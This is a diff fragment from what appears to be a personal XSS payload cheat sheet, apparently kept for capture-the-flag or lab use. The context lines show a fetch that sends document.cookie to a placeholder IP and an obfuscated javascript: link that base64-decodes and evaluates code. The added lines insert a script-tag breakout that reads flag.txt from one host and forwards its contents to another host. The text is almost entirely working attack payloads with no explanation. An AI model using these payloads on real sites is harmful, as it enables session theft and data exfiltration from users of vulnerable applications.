@@ -10,6 +10,13 @@ fetch('http://IP ADDRESS/?c=' + document.cookie)
 ENCODED - > base64 playload -> pop up
 <a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
 
+'"><script>
+  fetch('http://10.80.155.68:8080/flag.txt')
+    .then(response => response.text())
+    .then(data => {
+      fetch('http://192.168.132.61:2121/?flag=' + encodeURIComponent(data));
+    });
+</script>
 
 INJECTIONS
 
